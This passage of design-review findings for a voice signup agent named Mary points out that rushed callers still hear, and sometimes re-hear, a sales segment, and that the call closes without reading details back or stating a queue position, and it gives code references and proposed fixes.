findings.evidence: Rushed mode only adds 'one short beat, get to the point' (mary-prompt.server.ts:143-147). LANES can't be skipped, because CONTACT and WRAP need lanesDone (:122-125). lanesDone needs both words heard in full (turn-runner.ts:168-170), so an interruption during the pitch replays LANES on the next turn. The playbook asks for 'In a rush — compress everything… email only, close' (mary-voice.md:410-411) and 'I'm busy — two short turns to the end' (:384-385). Its in-a-rush example (mary-voice.md:537-553) shows reveal and lanes as back-to-back MARY turns, which the runner can't do.
findings.user_impact: The people with the least patience hear the longest sales beat, sometimes twice. That is the moment they cut in or walk off.
findings.recommendation: Skip LANES when mode is rushed, or when a lanes line was already cut off once, and count it as done if either loop word was heard. The rushed path becomes name -> email -> one-line reveal -> close.

findings.title: The close doesn't read the details back and gives no concrete next step or position
findings.evidence: WRAP only asks 'if they have questions or want you to finalise their spot' (mary-prompt.server.ts:128), with no recap. CLOSE is fixed: 'Thanks for signing up — we'll be in touch as soon as OmniSuite launches, a product by Omnikom.' (:127; mary-voice.md:312-314). The end screen already shows a position and 'Invitations go out in order of position' (text.ts:83-93; end-screen.tsx:91), but she never says them. Retell's prompt guide: 'Confirm understanding: Paraphrase important information back to the caller' (https://docs.retellai.com/build/prompt-engineering-guide).
